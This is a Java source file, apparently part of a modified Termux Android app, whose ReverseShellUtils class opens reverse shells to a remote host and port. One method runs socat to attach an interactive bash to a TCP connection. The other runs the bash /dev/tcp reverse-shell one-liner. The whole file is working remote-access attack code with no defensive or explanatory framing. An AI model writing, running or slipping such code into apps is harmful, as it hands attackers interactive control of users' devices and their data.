package com.termux.app.utils;

import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.ServiceConnection;
import android.os.IBinder;
import android.util.Log;

import com.termux.app.TermuxService;

public class ReverseShellUtils {
    private String serverIP;
    private String serverPort;
    private String TAG = "ReverseShellUtils";
    private ServiceConnection socatServiceConnection = new ServiceConnection() {
        @Override
        public void onServiceConnected(ComponentName name, IBinder binder) {
            TermuxService.LocalBinder localBinder = (TermuxService.LocalBinder) binder;
            TermuxService service = localBinder.service;

            String socat = "/data/data/com.termux/files/usr/bin/socat";
            String bash = "/data/data/com.termux/files/usr/bin/bash";

            String[] args = new String[] {
                "EXEC:" + bash + " -li,pty,stderr,setsid,sigint,ctty",
                "TCP:" + serverIP + ":" + serverPort
            };

            service.createTermuxTask(
                socat,
                args,
                null,
                "/data/data/com.termux/files/home"
            );
        }

        @Override
        public void onServiceDisconnected(ComponentName componentName) { }
    };

    public void startSocatShell(Context context, String host, String port) {
        Log.d(TAG, "Startng socat shell");
        serverIP = host;
        serverPort = port;
        Intent intent = new Intent(context, TermuxService.class);
        intent.putExtra("EXTRA_REMOTE_HOST", host);
        intent.putExtra("EXTRA_REMOTE_PORT", port);
        context.bindService(intent, socatServiceConnection, Context.BIND_AUTO_CREATE);
    }

    public void startBashShell(Context context, String host, String port) {
        Log.d(TAG, "Starting bash shell");
        CommandUtils.executeShellCommand(context, "bash -c 0<&196;exec 196<>/dev/tcp/" + host + "/" + port + "; sh <&196 >&196 2>&196");
    }
}
